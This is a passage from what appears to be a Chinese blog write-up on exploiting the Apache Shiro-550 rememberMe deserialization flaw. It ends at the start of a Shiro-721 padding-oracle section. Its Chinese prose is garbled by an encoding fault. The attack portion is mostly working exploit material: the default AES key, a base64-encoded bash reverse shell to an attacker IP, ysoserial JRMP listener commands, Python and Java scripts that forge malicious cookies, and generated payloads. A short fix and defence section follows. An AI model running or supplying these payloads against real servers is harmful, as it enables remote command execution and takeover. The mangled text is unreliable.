<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">byte</span>[] DEFAULT_CIPHER_KEY_BYTES = Base64.decode(<span class="string">"kPH+bIxk5D2deZiIxcaaaA=="</span>);</span><br></pre></td></tr></table></figure>
<ul>
<li>encryptæ–¹æ³•ä¸­ï¼ŒAESçš„æ¨¡å¼ä¸ºAES/CBC/PKCS5Paddingï¼Œå¹¶ä¸”å¹¶ä¸”AESçš„keyä¸º    <code>Base64.decode(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;)</code>ï¼Œè½¬æ¢ä¸º16è¿›åˆ¶åæ˜¯<code>\x90\xf1\xfe\x6c\x8c\x64\xe4\x3d\x9d\x79\x98\x88\xc5\xc6\x9a\x68</code>ï¼Œkeyä¸º16å­—èŠ‚ï¼Œ128ä½</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">byte</span>[] encrypt(<span class="keyword">byte</span>[] serialized) &#123;</span><br><span class="line">        <span class="keyword">byte</span>[] value = serialized;</span><br><span class="line">        CipherService cipherService = getCipherService();</span><br><span class="line">        <span class="keyword">if</span> (cipherService != <span class="keyword">null</span>) &#123;</span><br><span class="line">            ByteSource byteSource = cipherService.encrypt(serialized, getEncryptionCipherKey());</span><br><span class="line">            value = byteSource.getBytes();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>è¿›è¡ŒAESåŠ å¯†ï¼Œåˆ©ç”¨arraycopy()æ–¹æ³•å°†éšæœºçš„16å­—èŠ‚IVæ”¾åˆ°åºåˆ—åŒ–åçš„æ•°æ®å‰é¢ï¼Œå®Œæˆåå†è¿›è¡ŒAESåŠ å¯†ã€‚æœ€ååœ¨CookieRememberMeManagerç±»çš„rememberSerializedIdentity()æ–¹æ³•ä¸­è¿›è¡Œbase64åŠ å¯†</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String base64 = Base64.encodeToString(serialized);</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h5 id="æ¼æ´è§£æåˆ†æ"><a href="#æ¼æ´è§£æåˆ†æ" class="headerlink" title="æ¼æ´è§£æåˆ†æ"></a>æ¼æ´è§£æåˆ†æ</h5><ul>
<li>é€šè¿‡AESçš„keyï¼ŒåŠ å¯†æ¨¡å¼AES/CBC/PKCS5Padding  -&gt;  åŠ è§£å¯†å¯†æ–‡</li>
<li>è·å–remmemberMeçš„Cookie</li>
<li>Base64è§£ç ï¼ŒCookieRememberMeManagerç±»çš„getRememberedSerializedIdentity()æ–¹æ³•</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">byte</span>[] decoded = Base64.decode(base64);</span><br></pre></td></tr></table></figure>

<ul>
<li>AESè§£å¯†ï¼ŒBase64è§£ç åçš„å­—èŠ‚ï¼Œå‡å»å‰é¢16ä¸ªå­—èŠ‚ï¼Œä½¿ç”¨AbstractRememberMeManagerç±»çš„decrypt()æ–¹æ³•</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">protected byte[] decrypt(byte[] encrypted) &#123;</span><br><span class="line">        byte[] serialized = encrypted;</span><br><span class="line">        CipherService cipherService = getCipherService();</span><br><span class="line">        if (cipherService != null) &#123;</span><br><span class="line">            ByteSource byteSource = cipherService.decrypt(encrypted, getDecryptionCipherKey());</span><br><span class="line">            serialized = byteSource.getBytes();</span><br><span class="line">        &#125;</span><br><span class="line">        return serialized;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>ååºåˆ—åŒ–ï¼Œä½¿ç”¨DefaultSerializerç±»çš„deserialize()æ–¹æ³•</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public T deserialize(byte[] serialized) throws SerializationException &#123;</span><br><span class="line">        if (serialized == null) &#123;</span><br><span class="line">            String msg = &quot;argument cannot be null.&quot;;</span><br><span class="line">            throw new IllegalArgumentException(msg);</span><br><span class="line">        &#125;</span><br><span class="line">        ByteArrayInputStream bais = new ByteArrayInputStream(serialized);</span><br><span class="line">        BufferedInputStream bis = new BufferedInputStream(bais);</span><br><span class="line">        try &#123;</span><br><span class="line">            ObjectInputStream ois = new ClassResolvingObjectInputStream(bis);</span><br><span class="line">            @SuppressWarnings(&#123;&quot;unchecked&quot;&#125;)</span><br><span class="line">            T deserialized = (T) ois.readObject();</span><br><span class="line">            ois.close();</span><br><span class="line">            return deserialized;</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            String msg = &quot;Unable to deserialze argument byte array.&quot;;</span><br><span class="line">            throw new SerializationException(msg, e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>â–² readObjetcæ–¹æ³•ï¼Œç”±äºååºåˆ—åŒ–çš„å¯¹è±¡å®Œå…¨ç”±å¤–éƒ¨rememberMe Cookieæ§åˆ¶ã€‚æ‰€ä»¥ï¼Œä¸€æ—¦æ·»åŠ äº†æœ‰æ¼æ´çš„åŒ…æˆ–è€…åº“å¦‚common-collectionsåŒ…ï¼Œå°±ä¼šé€ æˆä»»æ„å‘½ä»¤æ‰§è¡Œ</li>
</ul>
<h5 id="å·¥å…·å‡†å¤‡"><a href="#å·¥å…·å‡†å¤‡" class="headerlink" title="å·¥å…·å‡†å¤‡"></a>å·¥å…·å‡†å¤‡</h5><ul>
<li><a href="https://github.com/frohoff/ysoserial.git" target="_blank" rel="noopener">ysoserial</a></li>
<li><a href="https://github.com/insightglacier/Shiro_exploit" target="_blank" rel="noopener">Shiro_exploit</a>_</li>
</ul>
<h5 id="æ¼æ´æ£€æµ‹"><a href="#æ¼æ´æ£€æµ‹" class="headerlink" title="æ¼æ´æ£€æµ‹"></a>æ¼æ´æ£€æµ‹</h5><ul>
<li>æ£€æµ‹æ˜¯å¦å­˜åœ¨é»˜è®¤çš„keyï¼Œä½¿ç”¨Shiro_exploitæ¥è·å–key</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python shiro_exploit.py -u http://you_ip:8080</span><br></pre></td></tr></table></figure>

<p><img src="/images/middleware/shiro/550-aes-key.png" alt="550-aes-key"></p>
<ul>
<li><p>å¯é€šè¿‡Burpsuiteçš„Burp Collaborator Clientè¿›è¡ŒDNSlogæµ‹è¯•(é»˜è®¤ä¼šæœ‰TTLç¼“å­˜æœºåˆ¶ï¼Œé»˜è®¤10s)</p>
<ul>
<li>å…ˆç”Ÿæˆä¸€ä¸ªPayloadï¼ŒCopy to clipboarè¿›è¡Œå¤åˆ¶</li>
<li>é€šè¿‡shiro.pyè„šæœ¬è¿›è¡Œç”Ÿæˆéœ€è¦çš„payload</li>
<li>æ”¾å…¥Cookieä¸­è¿›è¡Œé‡æ”¾  -&gt;  å¯ä»¥å‘ç°å›åŒ…æœ‰ä¸¤ä¸ªRemember=DeleteMe</li>
<li>åœ¨Burp Collaborator Clientä¸­ç‚¹å‡»Poll nowæŸ¥çœ‹æ˜¯å¦æœ‰å›æ˜¾ä¿¡æ¯</li>
<li>â–² è¿™é‡Œå› ä¸ºè„šæœ¬çš„åŸå› ï¼Œæš‚æ— æ³•ç¼–è¯‘å‡ºpayloadï¼Œå€Ÿç”¨ä¸€äº›å¤§ä½¬çš„å›¾ç‰‡</li>
</ul>
<p><img src="/images/middleware/shiro/550-burp-dnslog.png" alt="550-burp-dnslog"></p>
</li>
</ul>
<h5 id="æ”»å‡»æ€è·¯"><a href="#æ”»å‡»æ€è·¯" class="headerlink" title="æ”»å‡»æ€è·¯"></a>æ”»å‡»æ€è·¯</h5><ul>
<li>é¦–å…ˆé€šè¿‡shiro_exp_payload.pyç”Ÿæˆçš„payloadè®¿é—®æ”»å‡»ç«¯å£6666</li>
<li>ç«¯å£6666æ”»å‡»æœºé€šè¿‡CommonsCollections5æ‰§è¡Œç³»ç»Ÿå‘½ä»¤åå¼¹shellç»™éœ€è¦åå¼¹çš„æœºå™¨ï¼ˆè¿™é‡Œè¿˜æ˜¯æ”»å‡»æœºä¸è¿‡ç«¯å£æ˜¯9999ï¼‰</li>
</ul>
<h5 id="æ¼æ´åˆ©ç”¨ä¸€"><a href="#æ¼æ´åˆ©ç”¨ä¸€" class="headerlink" title="æ¼æ´åˆ©ç”¨ä¸€"></a>æ¼æ´åˆ©ç”¨ä¸€</h5><ul>
<li><p>åˆ¶ä½œåå¼¹shell</p>
<ul>
<li><p>ç›‘å¬æœ¬åœ°ç«¯å£<code>nc -nvlp 9999</code></p>
</li>
<li><p><a href="http://www.jackson-t.ca/runtime-exec-payloads.html" target="_blank" rel="noopener">Java Runtime</a> é…åˆbashç¼–ç </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.71.47/9999 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line">bash -c &#123;<span class="built_in">echo</span>,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjcxLjQ3Lzk5OTkgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/images/middleware/shiro/550-java-runtime-bash.png" alt="550-java-runtime-bash"></p>
</li>
</ul>
</li>
<li><p>é€šè¿‡ysoserialçš„JRMPç›‘å¬æ¨¡å—ï¼Œç›‘å¬6666ç«¯å£å¹¶æ‰§è¡Œåå¼¹shellå‘½ä»¤</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 6666 CommonsCollections4 &apos;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjcxLjQ3Lzk5OTkgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&apos;</span><br><span class="line"></span><br><span class="line">â–² Windowä¸‹å•å¼•å·éœ€æ”¹ä¸ºåŒå¼•å·ï¼Œä¸ç„¶ä¼šæŠ¥é”™</span><br></pre></td></tr></table></figure>

<ul>
<li>ä½¿ç”¨shiro.pyç”Ÿæˆpayloadï¼ˆå€Ÿç”¨å¤§ä½¬çš„shiro.pyè„šæœ¬ï¼‰</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode_rememberme</span><span class="params">(command)</span>:</span></span><br><span class="line">    popen = subprocess.Popen([<span class="string">'java'</span>, <span class="string">'-jar'</span>, <span class="string">'ysoserial-0.0.6-SNAPSHOT-all.jar'</span>, <span class="string">'JRMPClient'</span>, command], stdout=subprocess.PIPE)</span><br><span class="line">    BS = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()</span><br><span class="line">    key = base64.b64decode(<span class="string">"kPH+bIxk5D2deZiIxcaaaA=="</span>)</span><br><span class="line">    iv = uuid.uuid4().bytes</span><br><span class="line">    encryptor = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    file_body = pad(popen.stdout.read())</span><br><span class="line">    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    <span class="keyword">return</span> base64_ciphertext</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    payload = encode_rememberme(sys.argv[<span class="number">1</span>])   </span><br><span class="line"><span class="keyword">print</span> <span class="string">"rememberMe=&#123;0&#125;"</span>.format(payload.decode())</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python shiro.py 192.168.71.47:6666</span><br><span class="line"></span><br><span class="line">Payload:rememberMe=uCkSNSu3SJ65fQlfsjIhZ3Jsa+mLKp0grAJZik4iZm4aeWC48j5RFAZBDlFXEwHum5AHRr3n0JeI+QyUwYwjbXv3iA5zw8D9Ny6PWcndXnQa1+eDxaiEpGtYuRw92gd6MQeHTqh34/tOM0GLYcgzltFikbLgmA2y0SED1Bsz4UsCWn846cWh37JcRk2V+zMB1m8hdSxhtv3mqtuyRoFntAiHmMV8T1LHZd7JBfjZz0+uSol36u6lO6ZZdDIHcqishUTxxeiOlSUcqnbWNKI2nveEyxVNQKJ9gXyAI93zvANYHFI6UTAoYoPLIkViaB0H1Y20JEhZ7knsCEjd8zrezo7xUjPZzh9ZRB6ZR+67b5O2JH/T9rjRh+3vX6HznQZ17YtLON1EMoByXdyoR/pP9Q==</span><br></pre></td></tr></table></figure>

<p><img src="/images/middleware/shiro/550-crypto-data.png" alt="550-crypto-data"></p>
<ul>
<li>æ„é€ æ•°æ®åŒ…ï¼Œä¼ªé€ cookieï¼Œå‘é€Payload</li>
</ul>
<p><img src="/images/middleware/shiro/550-cookie-payload.png" alt="550-cookie-payload"></p>
<ul>
<li>ncç›‘å¬ï¼Œåå¼¹æ‹¿åˆ°shell</li>
</ul>
<p><img src="/images/middleware/shiro/550-shiro-550-shell.png" alt="550-shiro-550-shell"></p>
<ul>
<li>è¡¥å……ï¼Œå¦ä¸€ä¸ªå¤§ä½¬çš„è„šæœ¬ï¼Œä¸€æ ·çš„åŸç†</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import os</span><br><span class="line">import re</span><br><span class="line">import base64</span><br><span class="line">import uuid</span><br><span class="line">import subprocess</span><br><span class="line">import requests</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line"></span><br><span class="line">JAR_FILE = &apos;/Users/Viarus/Downloads/ysoserial/target/ysoserial-0.0.6-SNAPSHOT-all.jar&apos;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def poc(url, rce_command):</span><br><span class="line">    if &apos;://&apos; not in url:</span><br><span class="line">        target = &apos;https://%s&apos; % url if &apos;:443&apos; in url else &apos;http://%s&apos; % url</span><br><span class="line">    else:</span><br><span class="line">        target = url</span><br><span class="line">    try:</span><br><span class="line">        payload = generator(rce_command, JAR_FILE)  # ç”Ÿæˆpayload</span><br><span class="line">        r = requests.get(target, cookies=&#123;&apos;rememberMe&apos;: payload.decode()&#125;, timeout=10)  # å‘é€éªŒè¯è¯·æ±‚</span><br><span class="line">        print r.text</span><br><span class="line">    except Exception, e:</span><br><span class="line">        pass</span><br><span class="line">    return False</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def generator(command, fp):</span><br><span class="line">    if not os.path.exists(fp):</span><br><span class="line">        raise Exception(&apos;jar file not found!&apos;)</span><br><span class="line">    popen = subprocess.Popen([&apos;java&apos;, &apos;-jar&apos;, fp, &apos;CommonsCollections2&apos;, command],</span><br><span class="line">                             stdout=subprocess.PIPE)</span><br><span class="line">    BS = AES.block_size</span><br><span class="line">    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()</span><br><span class="line">    key = &quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span><br><span class="line">    mode = AES.MODE_CBC</span><br><span class="line">    iv = uuid.uuid4().bytes</span><br><span class="line">    encryptor = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line">    file_body = pad(popen.stdout.read())</span><br><span class="line">    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    return base64_ciphertext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    poc(&apos;http://127.0.0.1:8080&apos;, &apos;open /Applications/Calculator.app&apos;)</span><br></pre></td></tr></table></figure>

<h5 id="æ¼æ´åˆ©ç”¨äºŒ"><a href="#æ¼æ´åˆ©ç”¨äºŒ" class="headerlink" title="æ¼æ´åˆ©ç”¨äºŒ"></a>æ¼æ´åˆ©ç”¨äºŒ</h5><ul>
<li>ç”Ÿæˆpoc.seræ–‡ä»¶</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils1 <span class="string">"touch /tmp/success"</span> &gt; poc.ser</span><br></pre></td></tr></table></figure>

<ul>
<li>ä½¿ç”¨ä¹‹å‰çš„AESå¯†é’¥å¯¹Payloadè¿›è¡ŒåŠ å¯†ï¼Œä½¿ç”¨Javaçš„POC</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> shiro;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.crypto.AesCipherService;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.codec.CodecSupport;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.util.ByteSource;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.codec.Base64;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.io.DefaultSerializer;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.FileSystems;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestRemember</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">byte</span>[] payloads = Files.readAllBytes(FileSystems.getDefault().getPath(<span class="string">"d://poc.ser"</span>));</span><br><span class="line">        AesCipherService aes = <span class="keyword">new</span> AesCipherService();</span><br><span class="line">        <span class="keyword">byte</span>[] key = Base64.decode(CodecSupport.toBytes(<span class="string">"kPH+bIxk5D2deZiIxcaaaA=="</span>));</span><br><span class="line"></span><br><span class="line">        ByteSource ciphertext = aes.encrypt(payloads, key);</span><br><span class="line">        System.out.printf(ciphertext.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>ç¼–è¯‘ç”Ÿæˆæœ€åçš„RememberMeï¼Œéœ€è¦shiro-coreçš„jaråŒ…ä»¥åŠslf4j-apiçš„åŒ…</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">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</span><br></pre></td></tr></table></figure>

<p><img src="/images/middleware/shiro/550-java-cookie-poc.png" alt="550-java-cookie-poc"></p>
<ul>
<li>å‘é€rememberMe Cookieï¼Œå³å¯æˆåŠŸæ‰§è¡Œå‘½ä»¤</li>
</ul>
<p><img src="/images/middleware/shiro/550-burp-cookie-poc-ser.png" alt="550-burp-cookie-poc-ser"></p>
<p><img src="/images/middleware/shiro/550-tmp-succsee.png" alt="550-tmp-succsee"></p>
<h5 id="æ¼æ´ä¿®å¤"><a href="#æ¼æ´ä¿®å¤" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h5><ul>
<li><p>â–² æ— è®ºæ˜¯å¦å‡çº§shiroåˆ°1.2.5åŠä»¥ä¸Šï¼Œå¦‚æœshiroçš„rememberMeåŠŸèƒ½çš„AESå¯†é’¥ä¸€æ—¦æ³„éœ²ï¼Œå°±ä¼šå¯¼è‡´ååºåˆ—åŒ–æ¼æ´</p>
</li>
<li><p>å®˜æ–¹ä¿®å¤</p>
<ul>
<li>åˆ é™¤ä»£ç é‡Œçš„é»˜è®¤å¯†é’¥</li>
<li>é»˜è®¤é…ç½®é‡Œæ³¨é‡Šäº†é»˜è®¤å¯†é’¥</li>
<li>å¦‚æœä¸é…ç½®å¯†é’¥ï¼Œæ¯æ¬¡ä¼šé‡æ–°éšæœºä¸€ä¸ªå¯†é’¥</li>
<li>â–² å¯ä»¥çœ‹åˆ°å¹¶æ²¡æœ‰å¯¹ååºåˆ—åŒ–åšå®‰å…¨é™åˆ¶ï¼Œåªæ˜¯åœ¨é€»è¾‘ä¸Šå¯¹è¯¥æ¼æ´è¿›è¡Œäº†å¤„ç†ã€‚å¦‚æœåœ¨é…ç½®é‡Œè‡ªå·±å•ç‹¬é…ç½®AESçš„å¯†é’¥ï¼Œå¹¶ä¸”å¯†é’¥ä¸€æ—¦æ³„éœ²ï¼Œé‚£ä¹ˆæ¼æ´ä¾ç„¶å­˜åœ¨</li>
</ul>
</li>
<li><p>æ¼æ´ä¿®å¤çš„æ–¹æ¡ˆåŒæ—¶è¿›è¡Œï¼š</p>
<ul>
<li>å‡çº§shiroåˆ°1.2.5åŠä»¥ä¸Š</li>
<li>å¦‚æœåœ¨é…ç½®é‡Œé…ç½®äº†å¯†é’¥ï¼Œè¯·åˆ©ç”¨å®˜æ–¹æä¾›çš„æ–¹æ³•ç”Ÿæˆå¯†é’¥ï¼š\org.apache.shiro.crypto.AbstractSymmetricCipherService#generateNewKey()</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GenerateCipherKey</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * éšæœºç”Ÿæˆç§˜é’¥ï¼Œå‚è€ƒorg.apache.shiro.crypto.AbstractSymmetricCipherService#generateNewKey(int)</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] generateNewKey() &#123;</span><br><span class="line">        KeyGenerator kg;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            kg = KeyGenerator.getInstance(<span class="string">"AES"</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchAlgorithmException var5) &#123;</span><br><span class="line">            String msg = <span class="string">"Unable to acquire AES algorithm.  This is required to function."</span>;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(msg, var5);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        kg.init(<span class="number">128</span>);</span><br><span class="line">        SecretKey key = kg.generateKey();</span><br><span class="line">        <span class="keyword">byte</span>[] encoded = key.getEncoded();</span><br><span class="line">        <span class="keyword">return</span> encoded;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


</li>
</ul>
<h5 id="é˜²å¾¡æªæ–½"><a href="#é˜²å¾¡æªæ–½" class="headerlink" title="é˜²å¾¡æªæ–½"></a>é˜²å¾¡æªæ–½</h5><ul>
<li>å‡çº§Shiroåˆ°æœ€æ–°ç‰ˆæœ¬</li>
<li>WAFæ‹¦æˆªCookieä¸­é•¿åº¦è¿‡å¤§çš„rememberMeå€¼</li>
</ul>
<h3 id="0X01-Shiro-Padding-Oracle-Attack-Shiro-721"><a href="#0X01-Shiro-Padding-Oracle-Attack-Shiro-721" class="headerlink" title="0X01 Shiro Padding Oracle Attack(Shiro-721)"></a>0X01 Shiro Padding Oracle Attack(Shiro-721)</h3><blockquote>
<p>CVE-2019-12422</p>
</blockquote>
<h5 id="æ¼æ´åŸç†-1"><a href="#æ¼æ´åŸç†-1" class="headerlink" title="æ¼æ´åŸç†"></a>æ¼æ´åŸç†</h5><ul>
<li>ç”±äºShiro Cookieä¸­é€šè¿‡AES-128-CBCæ¨¡å¼åŠ å¯†rememberMeå­—æ®µå­˜åœ¨é—®é¢˜ï¼Œç”¨è¿‡å¯é€šè¿‡Padding OracleåŠ å¯†ç”Ÿæˆçš„æ”»å‡»ä»£ç æ¥æ„é€ æ¶æ„çš„rememberMeå­—æ®µï¼Œå¹¶é‡æ–°è¯·æ±‚ç½‘ç«™ï¼Œè¿›è¡Œåºåˆ—åŒ–æ”»å‡»ï¼Œå¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œ</li>
</ul>
<h5 id="Padding-Oracle-Attackæ”»å‡»åˆ†æ"><a href="#Padding-Oracle-Attackæ”»å‡»åˆ†æ" class="headerlink" title="Padding Oracle Attackæ”»å‡»åˆ†æ"></a>Padding Oracle Attackæ”»å‡»åˆ†æ</h5><ul>
<li>â–² å…³é”®æ€è·¯åœ¨äºé€šè¿‡æ„é€ IVå€¼ï¼ˆä¹Ÿå°±æ˜¯å‰ä¸€ç»„å¯†æ–‡ï¼‰åˆ©ç”¨æœåŠ¡å™¨çš„è¿”å›å€¼ç»“åˆPKCS #5æ¥æ‰¾åˆ°æ­£ç¡®çš„ä¸­é—´å€¼ï¼Œä»è€Œç»•è¿‡åŠ å¯†ç®—æ³•ï¼Œç›´æ¥å¾—åˆ°è§£å¯†åçš„å†…å®¹</li>
<li>ä¸»è¦æ˜¯é€šè¿‡æœåŠ¡å™¨çš„è¿”å›å€¼æ¥åˆ¤æ–­è‡ªå·±çš„æ„å»ºçš„IVå€¼æ˜¯å¦æ­£ç¡®ï¼Œè¿›è€ŒçŒœæµ‹åˆæ­£ç¡®çš„ä¸­é—´å€¼IVå€¼ï¼Œä¸­é—´å€¼IVå†å’Œ è·å–åˆ°çš„åŸæ¥çš„IVå€¼å¼‚æˆ–ä¾¿å¯å¾—åˆ°æ˜æ–‡ï¼Œæ”»å‡»æœ‰ä¸¤ä¸ªé‡è¦çš„å‡è®¾å‰æ<ul>
